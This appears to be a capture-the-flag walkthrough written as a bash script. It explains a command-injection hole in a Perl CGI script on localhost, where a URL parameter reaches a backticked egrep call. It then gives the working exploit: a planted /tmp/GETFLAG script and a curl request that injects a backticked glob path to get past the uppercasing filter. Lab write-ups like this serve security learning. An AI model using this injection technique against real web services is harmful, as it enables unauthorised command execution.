#!/bin/bash
# #!/usr/bin/env perl
# # localhost:4646
# use CGI qw{param};
# print "Content-type: text/html\n\n";
# 
# sub t {
#   $nn = $_[1];
#   $xx = $_[0];
#   $xx =~ tr/a-z/A-Z/;
#   $xx =~ s/\s.*//;
#   @output = `egrep "^$xx" /tmp/xd 2>&1`;
#   foreach $line (@output) {
#       ($f, $s) = split(/:/, $line);
#       if($s =~ $nn) {
#           return 1;
#       }
#   }
#   return 0;
# }
# 
# sub n {
#   if($_[0] == 1) {
#       print("..");
#   } else {
#       print(".");
#   }
# }
# 
# n(t(param("x"), param("y")));
# 
# We can see a script which run on localhost:4646. This script take x and y as url parameters.
# 
# At this line: 
# 
#   @output = `egrep "^$xx" /tmp/xd 2>&1`;
# 
# We can see a code execution and it take the $xx variable, which is a transformed version of x.
# 
# It is modified by 2 regexes :
#   $xx =~ tr/a-z/A-Z/;
#   $xx =~ s/\s.*//;
# 
# The first regex uppercases every letter.
# The second one will remove everything after the first whitespace encountered.
# So, we can create a file at /tmp named GETFLAG. 
# This file contain a call to /bin/getflag and redirect the output in a file. 
echo -n "/bin/getflag > /var/crash/token" > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
# 
# We can't send /tmp/GETFLAG to the script because the 
# regex will modify the path to /TMP/GETFLAG. We can replace tmp by *. 
# 
# We can call localhost with curl like that.

curl localhost:4646?x='`/*/GETFLAG`'
